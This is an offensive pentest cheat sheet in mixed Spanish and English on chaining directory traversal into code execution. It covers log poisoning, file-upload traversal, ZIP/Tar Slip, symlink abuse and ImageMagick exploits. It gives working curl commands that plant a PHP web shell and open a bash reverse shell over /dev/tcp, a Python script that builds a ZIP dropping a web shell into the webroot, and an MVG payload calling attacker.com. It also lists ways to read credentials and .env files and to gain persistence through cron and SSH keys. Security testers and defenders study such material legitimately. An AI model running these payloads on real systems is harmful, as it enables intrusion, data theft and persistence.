---
aliases:
  - LFI to RCE
  - ZIP Slip
  - Tar Slip
  - Symlink Abuse
tags:
  - type/cheatsheet
  - vuln/path-traversal
  - technique/execution
  - technique/lateral-movement
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Directory Traversal]]'
  - '[[File Inclusion]]'
  - '[[Insecure Deserialization]]'
---
# Directory Traversal - Chains y Variantes

***

## LFI to RCE Chain

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Log poisoning | Inject PHP code en `User-Agent` → access log → LFI to log → execute | Common. |
| `/var/log/apache2/access.log` poison | `<?php system($_GET['c']); ?>` en UA | Standard. |
| `/var/log/nginx/access.log` | Same | Same. |
| `/proc/self/environ` poison | Inject via env var (CGI) → LFI | Linux. |
| Mail log poison | `/var/log/mail.log` con SMTP RCPT TO injection | Less common. |
| Session file poison | `/var/lib/php/sessions/sess_X` | Inject PHP via session var → LFI session file. |
| PHP filter chain | `php://filter` con multiple converters → polyglot | Recent technique. |
| PHPGGC + Phar | Upload Phar → LFI triggers unserialize → RCE | Combo deserialization. |
| File upload + LFI | Upload `.txt` con `<?php` → LFI to that file | Standard. |
| Image with PHP code | EXIF metadata con PHP → LFI con extension bypass | Polyglot. |
| `data://` wrapper | `data://text/plain,<?php system('id'); ?>` | Direct (PHP). |
| `expect://` wrapper | `expect://id` | If PHP expect ext loaded. |
| Tomcat `WEB-INF/web.xml` LFI | Read app config → leak creds | Java. |
| Spring `application.properties` LFI | Same — config disclosure | Java. |
| `.env` file disclosure | `/var/www/.env` con DB password | Common. |
^pt-chain-lfi-rce

### Workflow log poisoning + LFI

```bash
# 1. Inject PHP code via User-Agent
curl -A '<?php system($_GET["c"]); ?>' https://target/

# 2. Log file ahora contains PHP code
# /var/log/apache2/access.log

# 3. Trigger LFI to read log
curl 'https://target/page?file=../../../var/log/apache2/access.log&c=id'
# PHP server reads log file → executes <?php system("id"); ?>
# Output: uid=33(www-data) gid=33(www-data) ...

# 4. Reverse shell
curl 'https://target/page?file=../../../var/log/apache2/access.log&c=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FIP%2F4444%200%3E%261%22'
```

___

## Path Traversal en File Upload

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Filename traversal | Upload con filename `../../../var/www/html/sh.php` | Force write to webroot. |
| Server unescape filename | If server uses unsanitized filename for storage | Direct webshell drop. |
| Doble extension trick | `shell.php.jpg` con filename traversal | Bypass extension check. |
| Null byte filename | `shell.php%00.jpg` | Truncate trailing. |
| Encoded slash filename | `..%2fshell.php` | URL-encoded. |
| Multipart filename injection | `Content-Disposition: filename="../../sh.php"` | Standard. |
| Replace existing file | Filename traversal a `index.php` → overwrite | Site defacement. |
| Write to unprotected dir | `/tmp/sh.php` or `/var/tmp/` | If readable via web. |
| CRLF in filename | Inject headers via filename | Edge. |
| Windows backslash filename | `..\\..\\inetpub\\wwwroot\\sh.aspx` | Windows. |
| Filename with symlink target | If app extracts archives — see ZIP Slip | Combine. |
| Filename pivot to other user | `/home/user/.ssh/authorized_keys` | If permissions allow. |
^pt-chain-upload

___

## ZIP Slip / Tar Slip / Archive Traversal

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | App extracts archive (zip, tar, etc) sin validating entry paths. Atacante embeds entries con `../` paths. | CVE-2018-8014 (multiple libs). |
| ZIP entry name | Entry: `../../etc/cron.d/poison` | After extract, lands en `/etc/cron.d/poison`. |
| Tar Slip | Tar entry name con `../` | Same. |
| War Slip | WAR file con malicious paths | Java. |
| Affected libs (Java) | `zip4j`, Apache Commons Compress (old) | CVE list. |
| Affected libs (Python) | `tarfile.extract` w/o `filter` (pre-3.12) | CVE-2007-4559. |
| Affected libs (Node) | `unzipper`, `adm-zip`, `archiver` (old) | NPM CVEs. |
| Tool to create | https://github.com/snyk/zip-slip-vulnerability | Repo with exploit. |
| Symlink in archive | `tar` with symlink entry | Archive symlink follow. |
| Hard link in archive | Same — hard link target | Linker abuse. |
| Combine con upload | Upload malicious archive → server extracts | Standard. |
| Drop webshell via slip | Extract `sh.php` to `/var/www/html/` | RCE. |
| Drop SSH key | Extract `authorized_keys` to `~/.ssh/` | SSH access. |
| Drop cron job | Extract to `/etc/cron.d/` | Persistence. |
^pt-chain-zipslip

### Crafting malicious ZIP

```python
import zipfile

with zipfile.ZipFile('evil.zip', 'w') as zf:
    # Normal benign file
    zf.writestr('readme.txt', 'Looks innocent')
    
    # Malicious entry with traversal
    zf.writestr('../../../var/www/html/sh.php', 
                '<?php system($_GET["c"]); ?>')

# Upload evil.zip → server extracts → sh.php lands en webroot
```

___

## Symlink Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | Atacante creates symlink en uploaded file or controlled directory. Backend reads symlink target → reads sensitive file. | Local TOCTOU. |
| Atacante uploads symlink | App extracts archive con symlink → server reads target | ZIP slip variant. |
| Symlink in writable dir | `ln -s /etc/passwd /writable/poison` | Direct. |
| Race condition con symlink | Symlink swap during atomic operation | TOCTOU. |
| Image processing symlink | Upload symlink → server processes → reads target file | ImageTragick variant. |
| Apache `FollowSymLinks` | Apache config permits — directly readable | Misconfig. |
| nginx `disable_symlinks` off | Same | Config. |
| Container escape via symlink | Symlink en mount → host file access | Container break. |
| Docker volume symlink | Same | Same. |
| Backup tool symlink follow | Backup process reads symlink → target stored | Data exfil. |
| Tar `-h` flag | Tar with `-h` follows symlinks | Tool flag. |
| Symlink to `/dev/null` | Force read of empty | Bypass file existence check. |
| Symlink to `/proc/self/environ` | Read process env | Combo. |
^pt-chain-symlink

___

## ImageMagick / File Processors

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| ImageTragick (CVE-2016-3714) | MVG / SVG con `url()` directive | Direct file read + RCE. |
| Ghostscript injection | PostScript con file ops | Embedded `pipe` directive. |
| MVG read file | `image over 0,0 100,100 'file:///etc/passwd'` | MVG syntax. |
| MVG fetch URL (SSRF) | `image over 0,0 100,100 'http://attacker/log'` | SSRF via image. |
| SVG with foreignObject | Embed XML with traversal | Edge. |
| Polyglot file (PNG + ZIP) | File con multiple format magic bytes | Multi-vector. |
| LibreOffice headless conversion | Document with macros | Macro RCE. |
| ffmpeg HLS playlist | `concat:` protocol con file:// | Read files via media. |
| Pandoc | Document conversion with embedded paths | Edge. |
| GraphicsMagick | Similar to ImageMagick | Same family. |
| OpenCV | Image library | Less common. |
| Avatar upload + processing | Most common vector for these | Standard. |
^pt-chain-image

### MVG file read PoC

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/log?d=)'
pop graphic-context
```

Save as `evil.mvg`, upload as image. ImageMagick processes → fetches URL → SSRF + DNS oracle for filesystem reads.

***
